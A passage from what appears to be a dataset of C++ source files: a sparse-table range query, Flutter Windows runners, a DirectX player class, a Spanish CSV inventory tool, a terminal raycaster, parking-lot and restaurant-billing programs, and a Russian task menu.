r)//\u6c42\u533a\u95f4[l..r]\u7684\u6700\u503c \r\n{\r\n\tint k=log2(r-l+1);\r\n\treturn max(F[l][k],F[r-(1<<k)+1][k]);//\u53d6\u4e24\u4e2a\u533a\u95f4\u6700\u503c \r\n}\r\n\r\nint ST_print()\r\n{\r\n\tint k=log2(n);\r\n\tfor(int j=0;j<=k;j++)\r\n\t{\t\r\n\t\tfor(int i=1;i<=n-(1<<j)+1;i++)//n-2^j+1,\u6253\u5370\u7b2c\u4e00\u5217 \r\n\t\t\tcout<<F[i][j]<<\" \";\r\n\t\tcout<<endl;\r\n\t}\r\n}\r\n\r\nint main()\r\n{\r\n\tint l,r;\r\n\tint i,v;\r\n\tcin>>n;\r\n\tfor(i=1;i<=n;i++)\r\n\t\tcin>>a[i];//5 3 7 2 12 1 6 4 8 15\r\n\tST_create();//\u521b\u5efaST\u8868\r\n\tST_print();\r\n\tcout<<\"\u8f93\u5165\u67e5\u8be2\u6700\u503c\u7684\u533a\u95f4l r:\"<<endl;\r\n\tcin>>l>>r;\r\n\tcout<<ST_query(l,r)<<endl;//\u6c42\u533a\u95f4[l..r]\u7684\u6700\u503c\r\n\treturn 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"appab\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//-----------------------------------------------------------------------------\n// File: CPlayer.cpp\n//-----------------------------------------------------------------------------\n\n#include \"stdafx.h\"\n#include \"Player.h\"\n#include \"Shader.h\"\n\n///////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n// CPlayer\n\nCPlayer::CPlayer()\n{\n\tm_pCamera = NULL;\n\n\tm_xmf3Position = XMFLOAT3(0.0f, 0.0f, 0.0f);\n\tm_xmf3Right = XMFLOAT3(1.0f, 0.0f, 0.0f);\n\tm_xmf3Up = XMFLOAT3(0.0f, 1.0f, 0.0f);\n\tm_xmf3Look = XMFLOAT3(0.0f, 0.0f, 1.0f);\n\n\tm_xmf3Velocity = XMFLOAT3(0.0f, 0.0f, 0.0f);\n\tm_xmf3Gravity = XMFLOAT3(0.0f, 0.0f, 0.0f);\n\tm_fMaxVelocityXZ = 0.0f;\n\tm_fMaxVelocityY = 0.0f;\n\tm_fFriction = 0.0f;\n\n\tm_fPitch = 0.0f;\n\tm_fRoll = 0.0f;\n\tm_fYaw = 0.0f;\n\n\tm_pPlayerUpdatedContext = NULL;\n\tm_pCameraUpdatedContext = NULL;\n}\n\nCPlayer::~CPlayer()\n{\n\tReleaseShaderVariables();\n\n\tif (m_pCamera) delete m_pCamera;\n}\n\nvoid CPlayer::CreateShaderVariables(ID3D12Device *pd3dDevice, ID3D12GraphicsCommandList *pd3dCommandList)\n{\n\tif (m_pCamera) m_pCamera->CreateShaderVariables(pd3dDevice, pd3dCommandList);\n}\n\nvoid CPlayer::UpdateShaderVariables(ID3D12GraphicsCommandList *pd3dCommandList)\n{\n}\n\nvoid CPlayer::ReleaseShaderVariables()\n{\n\tif (m_pCamera) m_pCamera->ReleaseShaderVariables();\n}\n\nvoid CPlayer::Move(DWORD dwDirection, float fDistance, bool bUpdateVelocity)\n{\n\tif (dwDirection)\n\t{\n\t\tXMFLOAT3 xmf3Shift = XMFLOAT3(0, 0, 0);\n\t\tif (dwDirection & DIR_FORWARD) xmf3Shift = Vector3::Add(xmf3Shift, m_xmf3Look, fDistance);\n\t\tif (dwDirection & DIR_BACKWARD) xmf3Shift = Vector3::Add(xmf3Shift, m_xmf3Look, -fDistance);\n\t\tif (dwDirection & DIR_RIGHT) xmf3Shift = Vector3::Add(xmf3Shift, m_xmf3Right, fDistance);\n\t\tif (dwDirection & DIR_LEFT) xmf3Shift = Vector3::Add(xmf3Shift, m_xmf3Right, -fDistance);\n\t\tif (dwDirection & DIR_UP) xmf3Shift = Vector3::Add(xmf3Shift, m_xmf3Up, fDistance);\n\t\tif (dwDirection & DIR_DOWN) xmf3Shift = Vector3::Add(xmf3Shift, m_xmf3Up, -fDistance);\n\n\t\tMove(xmf3Shift, bUpdateVelocity);\n\t}\n}\n\nvoid CPlayer::Move(const XMFLOAT3& xmf3Shift, bool bUpdateVelocity)\n{\n\tif (bUpdateVelocity)\n\t{\n\t\tm_xmf3Velocity = Vector3::Add(m_xmf3Velocity, xmf3Shift);\n\t}\n\telse\n\t{\n\t\tm_xmf3Position = Vector3::Add(m_xmf3Position, xmf3Shift);\n\t\tm_pCamera->Move(xmf3Shift);\n\t}\n}\n\nvoid CPlayer::Rotate(float x, float y, float z)\n{\n\tDWORD nCurrentCameraMode = m_pCamera->GetMode();\n\tif ((nCurrentCameraMode == FIRST_PERSON_CAMERA) || (nCurrentCameraMode == THIRD_PERSON_CAMERA))\n\t{\n\t\tif (x != 0.0f)\n\t\t{\n\t\t\tm_fPitch += x;\n\t\t\tif (m_fPitch > +89.0f) { x -= (m_fPitch - 89.0f); m_fPitch = +89.0f; }\n\t\t\tif (m_fPitch < -89.0f) { x -= (m_fPitch + 89.0f); m_fPitch = -89.0f; }\n\t\t}\n\t\tif (y != 0.0f)\n\t\t{\n\t\t\tm_fYaw += y;\n\t\t\tif (m_fYaw > 360.0f) m_fYaw -= 360.0f;\n\t\t\tif (m_fYaw < 0.0f) m_fYaw += 360.0f;\n\t\t}\n\t\tif (z != 0.0f)\n\t\t{\n\t\t\tm_fRoll += z;\n\t\t\tif (m_fRoll > +20.0f) { z -= (m_fRoll - 20.0f); m_fRoll = +20.0f; }\n\t\t\tif (m_fRoll < -20.0f) { z -= (m_fRoll + 20.0f); m_fRoll = -20.0f; }\n\t\t}\n\t\tm_pCamera->Rotate(x, y, z);\n\t\tif (y != 0.0f)\n\t\t{\n\t\t\tXMMATRIX xmmtxRotate = XMMatrixRotationAxis(XMLoadFloat3(&m_xmf3Up), XMConvertToRadians(y));\n\t\t\tm_xmf3Look = Vector3::TransformNormal(m_xmf3Look, xmmtxRotate);\n\t\t\tm_xmf3Right = Vector3::TransformNormal(m_xmf3Right, xmmtxRotate);\n\t\t}\n\t}\n\telse if (nCurrentCameraMode == SPACESHIP_CAMERA)\n\t{\n\t\tm_pCamera->Rotate(x, y, z);\n\t\tif (x != 0.0f)\n\t\t{\n\t\t\tXMMATRIX xmmtxRotate = XMMatrixRotationAxis(XMLoadFloat3(&m_xmf3Right), XMConvertToRadians(x));\n\t\t\tm_xmf3Look = Vector3::TransformNormal(m_xmf3Look, xmmtxRotate);\n\t\t\tm_xmf3Up = Vector3::TransformNormal(m_xmf3Up, xmmtxRotate);\n\t\t}\n\t\tif (y != 0.0f)\n\t\t{\n\t\t\tXMMATRIX xmmtxRotate = XMMatrixRotationAxis(XMLoadFloat3(&m_xmf3Up), XMConvertToRadians(y));\n\t\t\tm_xmf3Look = Vector3::TransformNormal(m_xmf3Look, xmmtxRotate);\n\t\t\tm_xmf3Right = Vector3::TransformNormal(m_xmf3Right, xmmtxRotate);\n\t\t}\n\t\tif (z != 0.0f)\n\t\t{\n\t\t\tXMMATRIX xmmtxRotate = XMMatrixRotationAxis(XMLoadFloat3(&m_xmf3Look), XMConvertToRadians(z));\n\t\t\tm_xmf3Up = Vector3::TransformNormal(m_xmf3Up, xmmtxRotate);\n\t\t\tm_xmf3Right = Vector3::TransformNormal(m_xmf3Right, xmmtxRotate);\n\t\t}\n\t}\n\n\tm_xmf3Look = Vector3::Normalize(m_xmf3Look);\n\tm_xmf3Right = Vector3::CrossProduct(m_xmf3Up, m_xmf3Look, true);\n\tm_xmf3Up = Vector3::CrossProduct(m_xmf3Look, m_xmf3Right, true);\n}\n\nvoid CPlayer::Update(float fTimeElapsed)\n{\n\tm_xmf3Velocity = Vector3::Add(m_xmf3Velocity, m_xmf3Gravity);\n\tfloat fLength = sqrtf(m_xmf3Velocity.x * m_xmf3Velocity.x + m_xmf3Velocity.z * m_xmf3Velocity.z);\n\tfloat fMaxVelocityXZ = m_fMaxVelocityXZ;\n\tif (fLength > m_fMaxVelocityXZ)\n\t{\n\t\tm_xmf3Velocity.x *= (fMaxVelocityXZ / fLength);\n\t\tm_xmf3Velocity.z *= (fMaxVelocityXZ / fLength);\n\t}\n\tfloat fMaxVelocityY = m_fMaxVelocityY;\n\tfLength = sqrtf(m_xmf3Velocity.y * m_xmf3Velocity.y);\n\tif (fLength > m_fMaxVelocityY) m_xmf3Velocity.y *= (fMaxVelocityY / fLength);\n\n\tXMFLOAT3 xmf3Velocity = Vector3::ScalarProduct(m_xmf3Velocity, fTimeElapsed, false);\n\tMove(xm",
    "#include <iostream>\n#include <ctime>\n#include <sstream>\n#include <fstream>\n#include <cstring>\n#include \"Lista.h\"\nusing namespace std;\n\n\n///Desarrollo de funciones\n\nvoid totalArticulosDiferentes(string fileName){ //Funci\u00f3n para contar los art\u00edculos diferentes\n    int contadorIteraciones = 0;\n    fstream fin;\n    fin.open(\"./\"+fileName, ios::in);  //Se abre el archivo csv\n    string line, palabra;\n    int total = -1;  //El contador comienza en -1 por la cabecera en el archivo\n    while (getline(fin, line)) {  //se recorren las l\u00edneas para contar\n        contadorIteraciones++;\n        total++; //se cuenta\n        stringstream s(line);\n        getline(s, palabra, ',');  //No cuenta los art\u00edculos marcados como ERROR\n        while (getline(s, palabra, ',')) {\n            contadorIteraciones++;\n            if (palabra.find(\"ERROR\") != std::string::npos)\n                total--;\n        }\n        }\n    cout << \"El total de articulos diferentes es \" << total << endl;  //Imprime la respuesta\n    cout << endl << \"Iteraciones realizadas: \" << contadorIteraciones<< \"\\n\" <<endl;\n}\nvoid totalArticulos(string fileName){   //Funci\u00f3n para contar el total de art\u00edculos\n    int contadorIteraciones = 0;\n    fstream fin;\n    fin.open(\"./\"+fileName, ios::in);   //Se abre el archivo csv\n    string line, palabra;\n    int total=0;\n    getline(fin, line);  //Se descarta la primera l\u00ednea del archivo\n    while(getline(fin,line)){  //se recorren las l\u00edneas del archivo\n        contadorIteraciones++;\n        stringstream s(line);\n        getline(s,palabra,',');  //se descartan las primeras tres columnas\n        getline(s,palabra,',');\n        getline(s,palabra,',');\n        if(palabra.find(\"ERROR\")!=std::string::npos ){  //Si hay error no se cuenta el stock en los dep\u00f3sitos\n            while(getline(s,palabra,',')){\n                contadorIteraciones++;\n                if(palabra.size()<1)\n                {\n                    palabra=\"0\";\n                }\n                total -= atoi(palabra.c_str());\n            }\n        }else{\n            while(getline(s,palabra,',')){//Si no hay error se cuentan el stock en los dep\u00f3sitos\n                contadorIteraciones++;\n                if(palabra.size()<1)\n                {\n                    palabra=\"0\";\n                }\n                total += atoi(palabra.c_str());\n            }\n        }\n    }\n    cout<< \"El total de articulos es \" << total << endl;   //Imprime la respuesta\n    cout << endl << \"Iteraciones realizadas: \" << contadorIteraciones<< \"\\n\" <<endl;\n}\nvoid minStock(string n, string fileName){   //Funci\u00f3n para imprimir todos los art\u00edculos que tengan igual o menos stock n\n    int contadorIteraciones = 0;\n    fstream fin;\n    fin.open(\"./\"+fileName, ios::in);   //Se abre el archivo csv\n    Lista<string> articulos; // lista para que cada art\u00edculo que cumpla con el stock se guarde\n    string line, palabra, nombreArticulo;\n    Lista<int> depositos;  //lista para guardar el stock en cada dep\u00f3sito\n    int i;\n    int suma;\n    int n2;\n    try\n    {\n        n2=atoi(n.c_str());\n    }\n    catch (invalid_argument& e)\n    {\n        // Si el argumento no es un n\u00famero v\u00e1lido, lanzar una excepci\u00f3n\n        cerr << \"Error: el segundo argumento debe ser un entero\\n\";\n        //return 3;\n    }\n\n    getline(fin, line);  //se descarta la primera l\u00ednea\n    while(getline(fin,line)){  //se recorren las l\u00edneas\n        contadorIteraciones++;\n        i=0;\n        suma=0;\n        depositos.vaciar();  //se vac\u00eda la lista\n        stringstream s(line);\n        while(getline(s,palabra,',')){  //se recorren las columnas\n            contadorIteraciones++;\n            i++;\n            if(i==3)  //se guarda el nombre del art\u00edculo\n                nombreArticulo = palabra;\n            if(i>3) {  //se inserta el stock de cada dep\u00f3sito en la lista\n                if (palabra.size() < 1) {\n                    palabra = \"0\";\n                }\n                depositos.insertarUltimo(atoi(palabra.c_str()));\n\n            }\n        }\n        for (int j=0; j<depositos.getTamanio(); j++){ //se suma el stock de cada dep\u00f3sito\n            contadorIteraciones++;\n            suma+=depositos.getDato(j);\n        }\n        if(suma<=n2)  //si cumple la condici\u00f3n se guarda el art\u00edculo\n            articulos.insertarUltimo(nombreArticulo);\n    }\n    cout << \"- El listado de articulos con stock menor o igual a \" << n << \" es:\" << endl << endl;\n    for (i=0; i<articulos.getTamanio(); i++){ //se imprimen los art\u00edculos\n        contadorIteraciones++;\n        cout<< articulos.getDato(i)<< endl;\n\n    }\n    cout << endl << \"Iteraciones realizadas: \" << contadorIteraciones<< \"\\n\" <<endl;\n}\nvoid minStockDep(string ncant,string nDep, string fileName) {//Funci\u00f3n para imprimir todos los art\u00edculos que tengan igual o menos stock n en un dep\u00f3sito espec\u00edfico\n    int contadorIteraciones = 0;\n    fstream fin;\n    fin.open(\"./\" + fileName, ios::in);  //Se abre el archivo csv\n    Lista<string> articulos;   // lista para que cada art\u00edculo que cumpla con el st",
    "#include \"../../engine/include/Screen.h\"\n#include \"../../engine/include/Map.h\"\n#include \"../../engine/include/Player.h\"\n#include \"../../engine/include/Raycaster.h\"\n#include \"../../engine/include/Config.h\"\n\n#include <termios.h>\n#include <unistd.h>\nint main() {\n  Config config;\n  if (!config.load(\"./LDKGame/config/game.conf\")) {\n    return 1;\n  }\n struct termios oldSettings, newSettings;\n tcgetattr(STDIN_FILENO, &oldSettings);\n newSettings = oldSettings;\n newSettings.c_lflag &= ~(ICANON | ECHO);\n tcsetattr(STDIN_FILENO, TCSANOW, &newSettings);\n  int screenWidth = config.getInt(\"screenWidth\");\n  int screenHeight = config.getInt(\"screenHeight\");\n  Screen screen(screenWidth, screenHeight);\n  Map map;\n  if (!map.load(\"./LDKGame/maps/map.txt\")) {\n    return 1;\n  }\n float playerStartX = config.getInt(\"playerStartX\");\n  float playerStartY = config.getInt(\"playerStartY\");\n  float playerStartDir = config.getInt(\"playerStartDir\") * M_PI / 180.0f;\n  Player player(playerStartX, playerStartY, playerStartDir);\n  Raycaster raycaster(map, screen);\n  bool isRunning = true;\n  while(isRunning)\n  {\n      screen.clear();\n      raycaster.castRays(player);\n      screen.draw();\n      char move = std::getchar();\n      if (move == 'w') player.move(0.1);\n      if (move == 's') player.move(-0.1);\n      if (move == 'a') player.rotate(-0.1);\n      if (move == 'd') player.rotate(0.1);\n      if (move == 'q') isRunning = false;\n   }\n tcsetattr(STDIN_FILENO, TCSANOW, &oldSettings);\n  return 0;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <cstdlib>\n\n#include <ctime>\n#include <vector>\n#include<chrono>\nusing namespace std;\nusing namespace std::chrono;\n#define RESET \"\\033[0m\"\n#define RED \"\\033[1;31m\"\n#define GREEN \"\\033[1;32m\"\n#define YELLOW \"\\033[1;33m\"\n#define BLUE \"\\033[1;34m\"\n\n\nclass Vehicle {\nprotected:\n    string ownerName, vehicleNumber, vehicleName, vehicleID;\n    bool isVip;\n    system_clock::time_point entryTime;\n\n\npublic:\n    Vehicle() :isVip(false) {};\n    virtual void calculateFee(int hours) = 0;\n\n    void setDetails(string name, string num, string vname, string id,bool vipStatus=false) {\n        ownerName = name;\n        vehicleNumber = num;\n        vehicleName = vname;\n        vehicleID = id;\n        isVip = vipStatus;\n        entryTime = system_clock::now();\n    }\n\n    string getVehicleID() {\n        return vehicleID;\n    }\n    bool getVipStatus() {\n        return isVip;\n    }\n\n    void displayDetails() {\n        cout << \"Owner Name: \" << ownerName << endl;\n        cout << \"Vehicle Number: \" << vehicleNumber << endl;\n        cout << \"Vehicle Name: \" << vehicleName << endl;\n        cout << \"Vehicle ID: \" << vehicleID << endl;\n        cout << \"VIP Status: \" << (isVip ? \"Yes\" : \"No\") << endl;\n    }\n    system_clock::time_point getEntryTime() {\n        return entryTime;\n    }\n};\n\nclass Car : public Vehicle {\n    void calculateFee(int seconds) override {\n        int fee = seconds * 10;\n        if (isVip) {\n            fee -= 5;  \n            cout << \"VIP Discount Applied!\" << endl;\n        }\n        fee = max(fee, 0);\n        cout << \"Parking fee for car: Rs \" << fee << endl;\n    }\n\n};\n\nclass Bike : public Vehicle {\n    void calculateFee(int seconds) override {\n        int fee = seconds* 5;\n        if (isVip) {\n            fee -= 2;  \n            cout << \"VIP Discount Applied!\" << endl;\n        }\n        fee = max(fee, 0);\n        cout << \"Parking fee for bike: Rs \" << fee << endl;\n    }\n\n};\n\nclass ParkingSlot {\nprotected:\n    static int totalSlots;\n    static int availableSlots;\n    static int vipSlots;\n\n\npublic:\n    static void initializeSlots(int total,int vip=0) {\n        totalSlots = total;\n        availableSlots = total;\n        vipSlots = vip;\n    }\n\n\n    static void allocateSlot(bool isVIP) {\n        if (isVIP && vipSlots > 0) {\n            vipSlots--;\n            cout << \"VIP Slot allocated!\" << endl;\n        }\n        else if (availableSlots > 0) {\n            availableSlots--;\n            cout << \"Regular slot allocated!\" << endl;\n        }\n        else {\n            cout << \"No slots available!\" << endl;\n        }\n        cout << \"Available slots: \" << availableSlots << endl;\n    }\n\n    static void freeSlot() {\n        if (availableSlots < totalSlots) {\n            availableSlots++;\n            cout << \"Slot freed!\" << endl;\n            cout << \"Available slots: \" << availableSlots << endl;\n        }\n        else {\n            cout << \"No slots to free!\" << endl;\n        }\n    }\n};\n\nint ParkingSlot::totalSlots = 0;\nint ParkingSlot::availableSlots = 0;\nint ParkingSlot::vipSlots = 0;\n\nstring generateUniqueID() {\n    srand(time(0));\n    stringstream ss;\n    ss << rand() % 10000;\n    return ss.str();\n}\nvoid saveVehicleDetails(const string& ownerName, const string& vehicleNumber, const string& vehicleName, const string& vehicleID) {\n  \n    ifstream file(\"vehicle_details.txt\");\n    string line;\n    bool exists = false;\n\n  \n    while (getline(file, line)) {\n        if (line.find(vehicleID) != string::npos) {\n            exists = true;  \n            break;\n        }\n    }\n\n    file.close();\n\n   \n    if (!exists) {\n        ofstream file(\"vehicle_details.txt\", ios::app);\n        if (file.is_open()) {\n            file << \"Owner Name: \" << ownerName << endl;\n            file << \"Vehicle Number: \" << vehicleNumber << endl;\n            file << \"Vehicle Company: \" << vehicleName << endl;\n            file << \"Vehicle ID: \" << vehicleID << endl;\n            file << \"------------------------\" << endl;\n            file.close();\n            cout << \"Vehicle details saved successfully!\" << endl;\n        }\n        else {\n            cout << \"Unable to save vehicle details.\" << endl;\n        }\n    }\n    else {\n        cout << \"This vehicle is already registered.\" << endl;\n    }\n}\n\n\nvoid viewParkingReport() {\n    ifstream file(\"vehicle_details.txt\");\n    string line;\n\n    if (file.is_open()) {\n        cout << \"Parking Report:\" << endl;\n        cout << \"----------------------------------\\n\";\n        while (getline(file, line)) {\n            cout << line << endl;\n        }\n        cout << \"----------------------------------\\n\";\n        file.close();\n    }\n    else {\n        cout << \"Unable to open parking report file.\" << endl;\n    }\n}\n\nvoid removeVehicleDetails(string vehicleID) {\n    ifstream file(\"vehicle_details.txt\");\n    string line;\n    vector<string> remainingData; \n\n    \n    while (getline(file, line)) {\n        if (line.find(vehicleID)",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"getx_application\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <unordered_map>\r\n#include <string>\r\n#include <vector>\r\n#include <iomanip>\r\n\r\n// User class representing a system user (admin or customer)\r\nclass User {\r\npublic:\r\n    std::string username;\r\n    std::string password;\r\n    std::string role; // \"admin\" or \"customer\"\r\n\r\n    User(std::string username, std::string password, std::string role)\r\n        : username(username), password(password), role(role) {}\r\n\r\n    bool checkPassword(const std::string& passwordInput) {\r\n        return password == passwordInput;\r\n    }\r\n};\r\n\r\n// Simple User Authentication and Authorization System\r\nclass AuthSystem {\r\nprivate:\r\n    std::unordered_map<std::string, User> users;\r\n\r\npublic:\r\n    AuthSystem() {\r\n        // Pre-populate the system with users (admin and customer)\r\n        users[\"admin\"] = User(\"admin\", \"admin123\", \"admin\");\r\n        users[\"customer1\"] = User(\"customer1\", \"customer123\", \"customer\");\r\n        users[\"customer2\"] = User(\"customer2\", \"customer123\", \"customer\");\r\n    }\r\n\r\n    // Authenticate a user by username and password\r\n    User* authenticate(const std::string& username, const std::string& password) {\r\n        if (users.find(username) != users.end() && users[username].checkPassword(password)) {\r\n            return &users[username];\r\n        }\r\n        return nullptr; // Invalid credentials\r\n    }\r\n};\r\n\r\n// Class for the restaurant billing system\r\nclass RestaurantBillingSystem {\r\nprivate:\r\n    AuthSystem& authSystem;\r\n    User* loggedInUser = nullptr;\r\n\r\npublic:\r\n    RestaurantBillingSystem(AuthSystem& authSys) : authSystem(authSys) {}\r\n\r\n    // Login method\r\n    bool login(const std::string& username, const std::string& password) {\r\n        loggedInUser = authSystem.authenticate(username, password);\r\n        return loggedInUser != nullptr;\r\n    }\r\n\r\n    // Logout method\r\n    void logout() {\r\n        loggedInUser = nullptr;\r\n        std::cout << \"Logged out successfully!\" << std::endl;\r\n    }\r\n\r\n    // Check if the current user is an admin\r\n    bool isAdmin() {\r\n        return loggedInUser && loggedInUser->role == \"admin\";\r\n    }\r\n\r\n    // Function available only for admins\r\n    void manageMenu() {\r\n        if (!isAdmin()) {\r\n            std::cout << \"You do not have permission to manage the menu.\" << std::endl;\r\n            return;\r\n        }\r\n        std::cout << \"Managing menu... (only accessible by admins)\" << std::endl;\r\n        // Admin specific tasks like adding or removing menu items\r\n    }\r\n\r\n    // Function available for both customers and admins\r\n    void viewMenu() {\r\n        std::cout << \"Displaying menu...\" << std::endl;\r\n        // Display the menu items (simulating a simple menu)\r\n        std::cout << \"1. Burger - $8.99\" << std::endl;\r\n        std::cout << \"2. Pizza - $12.49\" << std::endl;\r\n        std::cout << \"3. Pasta - $10.99\" << std::endl;\r\n        std::cout << \"4. Salad - $6.49\" << std::endl;\r\n        std::cout << \"5. Soda - $1.99\" << std::endl;\r\n    }\r\n\r\n    // Function available only for customers\r\n    void placeOrder() {\r\n        if (isAdmin()) {\r\n            std::cout << \"Admins cannot place orders.\" << std::endl;\r\n            return;\r\n        }\r\n        std::cout << \"Placing an order... (only accessible by customers)\" << std::endl;\r\n        // Simulate customer placing an order\r\n    }\r\n\r\n    // Function to display menu based on the role\r\n    void displayMenu() {\r\n        if (loggedInUser == nullptr) {\r\n            std::cout << \"Please log in to access the system.\" << std::endl;\r\n            return;\r\n        }\r\n\r\n        std::cout << \"\\n==== Restaurant Billing System ====\" << std::endl;\r\n        if (isAdmin()) {\r\n            std::cout << \"Hello Admin! You have the following options:\" << std::endl;\r\n            std::cout << \"1. Manage Menu\" << std::endl;\r\n            std::cout << \"2. View Menu\" << std::endl;\r\n        } else {\r\n            std::cout << \"Hello \" << loggedInUser->username << \"! You have the following options:\" << std::endl;\r\n            std::cout << \"1. View Menu\" << std::endl;\r\n            std::cout << \"2. Place Order\" << std::endl;\r\n        }\r\n        std::cout << \"3. Logout\" << std::endl;\r\n        std::cout << \"Enter your choice: \";\r\n    }\r\n\r\n    // Execute the chosen option\r\n    void executeChoice(int choice) {\r\n        if (choice == 1) {\r\n            if (isAdmin()) {\r\n                manageMenu();\r\n            } else {\r\n                viewMenu();\r\n            }\r\n        } else if (choice == 2) {\r\n            if (isAdmin()) {\r\n                manageMenu();\r\n            } else {\r\n                placeOrder();\r\n            }\r\n        } else if (choice == 3) {\r\n            logout();\r\n        } else {\r\n            std::cout << \"Invalid choice, please try again.\" << std::endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    // Initialize authentication system\r\n    AuthSystem authSystem;\r\n    RestaurantBillingSystem system(authSystem);\r\n\r\n    std::string username, password;\r\n    int choice;\r\n\r\n    // Simulate user login\r\n    std::cout << \"Enter usern",
    "\ufeff#include <iostream> // \u0414\u043b\u044f \u0432\u0432\u043e\u0434\u0430/\u0432\u044b\u0432\u043e\u0434\u0430\n#include <vector> // \u0414\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u043c\u0430\u0441\u0441\u0438\u0432\n#include <string> // \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430\n#include <fstream> // \u0411\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 \u0441 \u043d\u0430\u0431\u043e\u0440\u043e\u043c \u043a\u043b\u0430\u0441\u0441\u043e\u0432, \u043c\u0435\u0442\u043e\u0434\u043e\u0432 \u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043c\u043e\u0433\u0443\u0442 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u0442\u044c \u0441\u043e\u0431\u043e\u0439 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f/\u0437\u0430\u043f\u0438\u0441\u0438 \u0434\u0430\u043d\u043d\u044b\u0445 \u0438\u0437/\u0444\u0430\u0439\u043b \u0438 \u0442.\u0434\nusing namespace std;\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u043c\u0435\u043d\u044e\nvoid showMenu() {\n    cout << \"\\n\u041c\u0435\u043d\u044e \u0437\u0430\u0434\u0430\u0447:\\n\";\n    cout << \"1. \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0443\\n\";\n    cout << \"2. \u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0432\u0441\u0435 \u0437\u0430\u0434\u0430\u0447\u0438\\n\";\n    cout << \"3. \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0443\\n\";\n    cout << \"4. \u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0438 \u0432 \u0444\u0430\u0439\u043b\\n\";\n    cout << \"5. \u0417\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c \u0437\u0430\u0434\u0430\u0447\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\\n\";\n    cout << \"6. \u0412\u044b\u0439\u0442\u0438\\n\";\n    cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043e\u043f\u0446\u0438\u044e: \";\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432\u0441\u0435\u0445 \u0437\u0430\u0434\u0430\u0447\nvoid showTasks(const vector<string>& tasks) {\n    if (tasks.empty()) {\n        cout << \"\u0421\u043f\u0438\u0441\u043e\u043a \u0437\u0430\u0434\u0430\u0447 \u043f\u0443\u0441\u0442.\\n\";\n        return;\n    }\n    cout << \"\\n\u0412\u0430\u0448\u0438 \u0437\u0430\u0434\u0430\u0447\u0438:\\n\";\n    for (size_t i = 0; i < tasks.size(); ++i) {\n        cout << i + 1 << \". \" << tasks[i] << endl;\n    }\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u0437\u0430\u0434\u0430\u0447\u0438\nvoid deleteTask(vector<string>& tasks) {\n    